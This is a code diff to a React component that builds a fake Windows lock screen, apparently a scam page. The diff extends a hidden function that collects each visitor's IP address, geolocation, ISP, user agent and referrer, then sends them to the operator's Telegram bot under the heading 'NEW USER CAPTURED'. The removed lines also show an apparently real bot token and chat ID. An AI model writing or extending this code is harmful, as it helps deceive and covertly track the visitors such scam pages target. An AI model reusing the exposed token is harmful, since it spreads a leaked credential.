@@ -11,26 +11,76 @@ const WindowsLockSim: React.FC = () => {
     // TELEGRAM NOTIFICATION - USER ENTERED
     const sendTelegramAlert = async () => {
       try {
-        // Get user IP
+        // Get user IP and location info
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const ip = ipData.ip;
         
-        // Send to Telegram bot
+        // Get location details
+        let country = 'Unknown';
+        let countryCode = 'XX';
+        let city = 'Unknown';
+        let region = 'Unknown';
+        let isp = 'Unknown';
+        let timezone = 'Unknown';
+        
+        try {
+          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+          const geoData = await geoRes.json();
+          
+          country = geoData.country_name || 'Unknown';
+          countryCode = geoData.country_code || 'XX';
+          city = geoData.city || 'Unknown';
+          region = geoData.region || 'Unknown';
+          isp = geoData.org || 'Unknown';
+          timezone = geoData.timezone || 'Unknown';
+        } catch (error) {
+          // Fallback if first API fails
+          try {
+            const geoRes2 = await fetch(`https://ipinfo.io/${ip}/json`);
+            const geoData2 = await geoRes2.json();
+            
+            if (geoData2) {
+              country = geoData2.country || 'Unknown';
+              countryCode = geoData2.country || 'XX';
+              city = geoData2.city || 'Unknown';
+              region = geoData2.region || 'Unknown';
+              isp = geoData2.org || 'Unknown';
+              timezone = geoData2.timezone || 'Unknown';
+            }
+          } catch (error2) {
+            console.log('Both geolocation APIs failed');
+          }
+        }
+        
+        // Format local time
+        const now = new Date();
+        const localTime = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+        
+        // Get referrer
+        const referrer = document.referrer || 'Direct';
+        
+        // Format message exactly as you want
         const message = `
-🚨 NEW USER CAPTURED 🚨
-IP: ${ip}
-Country: Unknown
-User Agent: ${navigator.userAgent}
-Platform: ${navigator.platform}
-Language: ${navigator.language}
-Screen: ${window.screen.width}x${window.screen.height}
-Time: ${new Date().toLocaleString()}
+🌐 Domain: ${window.location.hostname}
+📍 IP Address: ${ip}
+🗺️ Country: ${country} (${countryCode})
+🏙️ Location: ${city}, ${region}
+🌐 ISP: ${isp}
+🕐 Timezone: ${timezone}
+⏰ Local Time: ${localTime}
+
+📱 User Agent:
+${navigator.userAgent}
+
+💻 Platform: ${navigator.platform}
+🔤 Language: ${navigator.language}
+🔗 Referrer: ${referrer}
         `;
         
         // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
-        const BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
-        const CHAT_ID = '-1003737910762';
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -155,7 +205,7 @@ Time: ${new Date().toLocaleString()}
         <source src="/vocal1-BYq15bXr.mp3" type="audio/mpeg" />
       </audio>
 
-      {/* YOUR EXACT ORIGINAL CONTENT BELOW - NOT TOUCHED */}
+      {/* YOUR EXACT ORIGINAL CONTENT - NO CHANGES BELOW THIS LINE */}
       <div className="fake-screen" style={{ backgroundImage: 'url("/windows-lock-sim_files/window_lock-CQufc91c.png")', backgroundSize: 'cover', backgroundPosition: 'center center', backgroundRepeat: 'no-repeat' }}>
         
         {/* Panel 1 */}
